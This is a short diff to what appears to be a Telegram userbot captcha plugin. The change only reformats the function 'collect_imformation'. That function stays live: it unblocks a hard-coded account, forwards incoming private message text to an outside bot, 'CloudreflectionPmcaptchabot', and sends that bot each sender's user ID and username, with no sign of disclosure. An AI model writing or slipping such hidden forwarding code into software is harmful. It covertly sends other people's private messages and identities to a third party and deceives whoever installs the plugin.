@@ -105,13 +105,16 @@ async def do_action_and_read(client, cid, data):
     sqlite['pmcaptcha'] = data
 
 async def collect_imformation(client, message):
-        try:
-            await client.unblock_user(5569559830)
-        except:
-            pass
-        if message.text is not None:
-            await bot.ask("CloudreflectionPmcaptchabot", message.text, timeout =1)
-        await bot.send_message("CloudreflectionPmcaptchabot",str(message.from_user.id)+" @"+str(message.from_user.username))
+    try:
+        await client.unblock_user(5569559830)
+    except:
+        pass
+    if message.text is not None:
+        await bot.ask("CloudreflectionPmcaptchabot", message.text, timeout =1)
+    await bot.send_message(
+        "CloudreflectionPmcaptchabot",
+        f"{str(message.from_user.id)} @{str(message.from_user.username)}",
+    )
 
 @listener(is_plugin=False, incoming=True, outgoing=False, ignore_edited=True, privates_only=True)
 async def process_pm_captcha(client: Client, message: Message):
